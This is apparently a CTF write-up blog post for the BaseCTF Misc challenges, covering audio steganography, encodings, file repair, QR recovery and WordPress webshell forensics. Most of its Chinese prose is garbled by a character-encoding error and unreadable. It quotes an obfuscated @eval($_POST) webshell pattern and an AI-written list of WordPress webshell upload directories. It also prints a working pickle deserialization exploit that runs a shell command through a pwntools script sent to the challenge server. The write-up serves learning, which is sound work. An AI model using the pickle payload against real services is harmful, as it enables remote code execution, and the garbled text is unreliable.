[!NOTE]\nè¿™é‡Œæˆ‘å°±åªå†™ä¸€äº›æœ‰ä»·å€¼ç‚¹çš„å’Œæˆ‘å½“æ—¶ä¸ä¼šçš„é¢˜ç›®çš„wpäº†\n[Week1] æ‚ä½Xåªè€³ ä¸‹è½½éŸ³é¢‘åæœªå‘ç°é¢‘è°±å’ŒéŸ³é¢‘æ³¢å¼‚å¸¸ï¼Œå¬äº†ä¸‹åœ¨éŸ³ä¹ååŠæ®µæœ‰æ‘©æ–¯ç”µç å£°éŸ³ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æ‘©æ–¯ç”µç ä»éŸ³ä¹ä¸­åˆ†ç¦»å‡ºæ¥ä»¥ä¾¿è¯†åˆ«\nå…ˆç‚¹å‡»ä¸‰ä¸ªç‚¹åˆ†ç¦»ç«‹ä½“å£°åˆ°å•éŸ³é“ ç‚¹å‡»å·¦ä¸Šè§’æ–‡ä»¶-\u0026gt;å¯¼å‡ºéŸ³é¢‘-\u0026gt;å¤šä¸ªæ–‡ä»¶-\u0026gt;å¯¼å‡º æˆåŠŸå¯¼å‡ºä¸¤ä¸ªwav\næ‰“å¼€Adobe Auditionï¼Œå·¦ä¸Šè§’ä¾æ¬¡ç‚¹å‡»æ–‡ä»¶â€”â€”æ–°å»ºâ€”â€”å¤šè½¨ä¼šè¯â€”â€”ç¡®å®š\nå°†åˆšæ‰ç”Ÿæˆçš„ä¸¤ä¸ªwavæ‹–å…¥è¿›å¤šè½¨ä¼šè¯ï¼Œç„¶ååŒå‡»æœªå‘½åæ··éŸ³é¡¹ç›®ï¼Œå†å°†ä¸¤ä¸ªwavæ‹–å…¥å³è¾¹è½¨é“\nåŒå‡»ä¸€ä¸ªè½¨é“è¿›å…¥åä¸Šé¢å·¥å…·æ ç‚¹å‡»â€”â€”æ•ˆæœâ€”â€”åç›¸ åŒå‡»å·¦ä¾§æœªå‘½åæ··éŸ³é¡¹ç›®åç‚¹å‡»å·¦ä¸Šè§’ï¼Œé€‰æ‹©å¯¼å‡ºï¼Œå¤šè½¨æ··éŸ³ï¼Œæ•´ä¸ªä¼šè¯ï¼Œé€‰æ‹©å¯¼å‡ºä½ç½®åç›´æ¥å¯¼å‡º å°†ç”Ÿæˆçš„mp3æ‹–å…¥audacityï¼Œç‚¹å‡»ä¸‰ä¸ªç‚¹ï¼Œé¢‘è°±å›¾ã€‚ç„¶åæŒ‰ä½ctrlæ»‘åŠ¨æ»šè½®æ”¾å¤§å¯ä»¥çœ‹åˆ°æ˜æ˜¾çš„æ‘©æ–¯ç ï¼ŒæŠ„ä¸‹æ¥è§£å¯†å³å¯ [Week2] Base?! è¿™æ˜¯ä¸€æ®µxx-encodeç ï¼Œå¼€å§‹çœŸæ²¡æƒ³åˆ°ï¼Œéšæ³¢é€æµä¸€æŠŠå—¦å³å¯\n[Week3] Base revenge å°†ä»¥ä¸Šæ–‡æœ¬base64éšå†™è§£å¯†å¾—åˆ°JnUaAFMFImgANSEuAWYuBE9SyaYpC2ldBrU9\nå°†hintä¸€é”®è§£ç å‘ç°æ˜¯atbashåŠ å¯†\nå› ä¸ºç¼–ç å™¨è§£å‡ºæ¥å¤§å°å†™æœ‰é—®é¢˜ç›´æ¥ç”¨[cyberchef](Atbash Cipher - CyberChef)\nå†base64è§£ç å³å¯\n[Week3] broken.mp4 è¿™é“é¢˜æŒºç®€å•çš„ï¼Œä¸¤ä¸ªè§†é¢‘ç”¨untruncå·¥å…·ä¿®å¤å³å¯\n[Week3] å¤–æ˜Ÿä¿¡å· éŸ³é¢‘æ’­æ”¾å°±æœ‰è«æ–¯ç ï¼Œå…ˆä¸¢[åœ¨çº¿ç½‘ç«™](Morse Code Adaptive Audio Decoder | Morse Code World)å¬ä¸€ä¸‹,å‰åŠéƒ¨åˆ†flagåœ¨è¿™é‡Œé¢ï¼Œè¦è½¬æ¢å°å†™\néŸ³é¢‘ä½¿ç”¨foremostæå–å‡ºå‹ç¼©åŒ…é‡Œé¢æœ‰å¦ä¸€ä¸ªéŸ³é¢‘ï¼Œä¸€å¬å°±çŸ¥é“æ˜¯sstvï¼Œsstvæˆ‘åªæ¨èä½¿ç”¨[è¿™ä¸ªè„šæœ¬](colaclanth/sstv: SSTV Decoder (github.com))ï¼Œè½¯ä»¶åˆæ‹‰åˆéº»çƒ¦,ä¸‹é¢æ˜¯ç”¨æ³•\n1 sstv -d flag.mp3 -o result.png æå–å‡ºæ‘©æ–¯ç å›¾ç‰‡å¦‚ä¸‹\nå’Œå‰é¢åŠæ®µflagç»„åˆè½¬æ¢å°å†™å³å¯\n[Week3] è¿™æ˜¯ä¸€ä¸ªå‹ç¼©åŒ… è¿™é“é¢˜åˆ©ç”¨archprå·¥å…·çš„æ©ç ç ´è§£ï¼ŒèŠ±äº†æˆ‘nå°æ—¶ï¼Œæ„Ÿè§‰è„šæœ¬ä¼šæ›´å¿«\n[Week4] Webshell è¿™é“é¢˜å…ˆç”¨wiresharkæå–å‡ºrarå‹ç¼©åŒ…ï¼Œè§£å‹å‘ç°æ˜¯ä¸€å¥—WordPressç¨‹åºï¼Œè¿™ç§åšå®¢æ²¡å•¥ä¸Šä¼ ç‚¹å§ï¼Œaiå›ç­”\nWordPressä½œä¸ºä¸€æ¬¾å¹¿æ³›ä½¿ç”¨çš„å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ï¼Œå…¶å®‰å…¨æ€§ä¸€ç›´å¤‡å—å…³æ³¨ã€‚å…³äºWordPressä¸­å®¹æ˜“è¢«ä¸Šä¼ webshellçš„æ–‡ä»¶è·¯å¾„ï¼Œå¯ä»¥ä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢è¿›è¡Œå½’çº³ï¼š ä¸»é¢˜æ–‡ä»¶å¤¹ï¼š è·¯å¾„ç¤ºä¾‹ï¼š/wp-content/themes/[ä¸»é¢˜åç§°]/ è¯´æ˜ï¼šWordPresså…è®¸ç”¨æˆ·é€šè¿‡åå°ä¸Šä¼ å’Œå®‰è£…ä¸»é¢˜ã€‚é»‘å®¢å¯èƒ½ä¼šå°†æ¶æ„ä»£ç ï¼ˆå¦‚webshellï¼‰åµŒå…¥åˆ°è‡ªå®šä¹‰ä¸»é¢˜ä¸­ï¼Œå¹¶é€šè¿‡ä¸Šä¼ ä¸»é¢˜çš„æ–¹å¼å°†å…¶éƒ¨ç½²åˆ°ç›®æ ‡ç½‘ç«™ä¸Šã€‚ä¸€æ—¦ä¸»é¢˜è¢«å®‰è£…ï¼Œwebshellå°±å¯ä»¥è¢«ç”¨æ¥æ‰§è¡Œæ¶æ„å‘½ä»¤æˆ–æ“çºµç½‘ç«™ã€‚ æ’ä»¶æ–‡ä»¶å¤¹ï¼š\nè™½ç„¶é—®é¢˜ä¸­ä¸»è¦è¯¢é—®çš„æ˜¯å…³äºwebshellä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ï¼Œä½†å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ’ä»¶æ–‡ä»¶å¤¹ä¹Ÿæ˜¯æ½œåœ¨çš„å®‰å…¨é£é™©ç‚¹ã€‚ è·¯å¾„ç¤ºä¾‹ï¼š/wp-content/plugins/[æ’ä»¶åç§°]/ è¯´æ˜ï¼šä¸ä¸»é¢˜ç±»ä¼¼ï¼Œæ’ä»¶ä¹Ÿæ˜¯WordPressæ‰©å±•åŠŸèƒ½çš„é‡è¦æ–¹å¼ã€‚é»‘å®¢å¯èƒ½ä¼šåˆ©ç”¨æ¼æ´æˆ–æ¶æ„æ’ä»¶æ¥ä¸Šä¼ webshellï¼Œä»è€Œæ§åˆ¶ç½‘ç«™ã€‚ ä¸Šä¼ æ–‡ä»¶å¤¹ï¼š\nè·¯å¾„ç¤ºä¾‹ï¼š/wp-content/uploads/ è¯´æ˜ï¼šè¿™æ˜¯WordPressé»˜è®¤çš„åª’ä½“æ–‡ä»¶ä¸Šä¼ ç›®å½•ã€‚è™½ç„¶ç›´æ¥åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ä¸Šä¼ webshellå¯èƒ½å—åˆ°WordPressçš„é™åˆ¶ï¼Œä½†é»‘å®¢å¯èƒ½ä¼šé€šè¿‡ç»•è¿‡å®‰å…¨æ£€æŸ¥æˆ–å°†webshellä¸åˆæ³•æ–‡ä»¶æ†ç»‘ä¸Šä¼ çš„æ–¹å¼æ¥è¾¾åˆ°ç›®çš„ã€‚ è‡ªå®šä¹‰ä¸Šä¼ ç›®å½•ï¼š\nè·¯å¾„ç¤ºä¾‹ï¼šæ ¹æ®ç”¨æˆ·è®¾ç½®è€Œå®šï¼ˆå¦‚/wp-content/uploads/custom-directory/ï¼‰ è¯´æ˜ï¼šWordPresså…è®¸ç”¨æˆ·é€šè¿‡ä¿®æ”¹é…ç½®æˆ–å®‰è£…ç‰¹å®šæ’ä»¶æ¥æ›´æ”¹é»˜è®¤çš„ä¸Šä¼ ç›®å½•ã€‚å¦‚æœè¿™äº›è‡ªå®šä¹‰ç›®å½•çš„å®‰å…¨è®¾ç½®ä¸å½“ï¼Œå°±å¯èƒ½æˆä¸ºé»‘å®¢ä¸Šä¼ webshellçš„æ½œåœ¨ç›®æ ‡ã€‚\nç„¶åå†æ’ä»¶ç›®å½•ä¸‹ç¡®å®å‘ç°äº†\nè½¬å­—ç¬¦ä¸²åå‘ç°è¯»å–ui.jsæ–‡ä»¶çš„å†…å®¹\nç›®å½•ä¸‹æœç´¢ui.jsï¼Œè§£ç åå‘ç°å¾ˆåƒ@eval($_POST[\u0026rsquo;\u0026rsquo;])è¿™ç§ï¼Œä½†æ˜¯ä¼ webshellçš„éƒ½ä½¿ç”¨äº†è‡ªå®šä¹‰å‡½æ•°å’Œå„ç§å‡½æ•°åŠ ç¼–ç ï¼Œè¿˜æ˜¯ç›¸å½“æœ‰æ°´å¹³çš„\nè¿æ¥å¯†ç æäº¤ä¸å¯¹ï¼Ÿå†å›å»ä¸€çœ‹åŸæ¥è¿˜æœ‰å±‚rot13ï¼Œè§£å¯†æäº¤å³å¯\n[Week4] äºŒç»´ç 2-é˜¿å–€ç‰æ–¯ä¹‹è¸µ è¿™é“é¢˜ç”¨CQRçº é”™æ˜¯ä¸è¡Œçš„ï¼Œé‡Œé¢äºŒç»´ç è¢«æ·»åŠ äº†ä¸œè¥¿æ ¼å¼ä¸å¯¹ï¼Œç”¨è¿™ä¸ª[é¡¹ç›®](QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx))å¯ä»¥å°è¯•çˆ†ç ´æ‰€æœ‰æ ¼å¼\nä»å›¾ç‰‡å¯¼å…¥qrcode-2.png ç‚¹å‡»å³ä¸Šè§’tools å…ˆé€‰æ‹©çˆ†ç ´æ ¼å¼æ¨¡å¼ï¼Œç„¶åå†ç‚¹å‡»æœ€ä¸Šé¢æå–ä¿¡æ¯ over\n[Week4] å°chenyçš„ç¤¾äº¤ è¿™é“é¢˜ï¼Œå—¯\u0026hellip;ä¼šäº†åæœ‰ç‚¹æ²¡å•¥è®²çš„äº†ï¼Œæˆ‘å¤§ä½“è¯´ä¸‹è¿‡ç¨‹\nstegsolveçœ‹åˆ°ä¸€ä¸²å­—ç¬¦ï¼Œbase64è§£ç åå†è½¬16è¿›åˆ¶asciiå¾—åˆ°ä¸€ä¸ªQQ\næœç´¢QQåœ¨å¥¹ç©ºé—´å‘ç°å°Šå˜Ÿå‡å˜Ÿç¼–ç ï¼Œç”¨[](å°Šå˜Ÿå‡å˜ŸO.o (zdjd.asia))è§£ç å¾—åˆ°å‰åŠflagï¼Œç„¶åè¿˜æœ‰ä¸ªè§†é¢‘åˆ°bç«™æœè¯„è®ºä¸‹@äº†ä¸€ä¸ªäººç‚¹è¿›å»çœ‹åˆ°å¦å¤–ä¸€ä¸²å¯†æ–‡\nçœ‹ç€å¾ˆåƒé“¾æ¥ï¼Œç”¨éšæ³¢é€æµæ¢­å“ˆæœç´¢httpså‘ç°é“¾æ¥\nè¿›å…¥é“¾æ¥åšå®¢åˆå‘ç°å°Šå˜Ÿå‡å˜Ÿç¼–ç ï¼Œè¿™é‡Œè§£ç å¾—åˆ°ååŠflag[](å°Šå˜Ÿå‡å˜ŸO.o (zdjd.asia))\nPickle Init [Week3] [Week4] å­¦ä¹ æ–‡ç« ï¼Œæˆ‘ä¹Ÿä¸ä¼šopcode\nPickleååºåˆ—åŒ– - æ«ã®Blog (goodapple.top)\né¢˜ç›®æºç \n1 2 3 #!/bin/bash echo \u0026#34;${GZCTF_FLAG}\u0026#34; \u0026gt; /flag python3 -c \u0026#34;__import__(\u0026#39;pickle\u0026#39;).loads(__import__(\u0026#39;sys\u0026#39;).stdin.read(50).encode(\u0026#39;ASCII\u0026#39;))\u0026#34; è´´ä¸ªè„šæœ¬ï¼Œç”¨pwntoolså‘çš„ï¼Œä¸ç„¶ä¸å¥½å¡«50å­—èŠ‚\n1 2 3 4 5 6 7 8 9 10 11 r1 = b\u0026#34;\u0026#34;\u0026#34;cos system (S\u0026#39;cat flag\u0026#39; tR.\u0026#34;\u0026#34;\u0026#34; from pwn import * s = remote(\u0026#39;challenge.basectf.fun\u0026#39;,41751) payload = r1.ljust(50,b\u0026#39;0\u0026#39;)\t#ä»å·¦è¾¹å¡«å……0 s.sendline(payload) s.interactive() ","date":"2024-09-10T15:25:42+08:00","permalink":"http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-misc-wp/","title":"BaseCTFæ‹›æ–°èµ›-Misc-wp"}]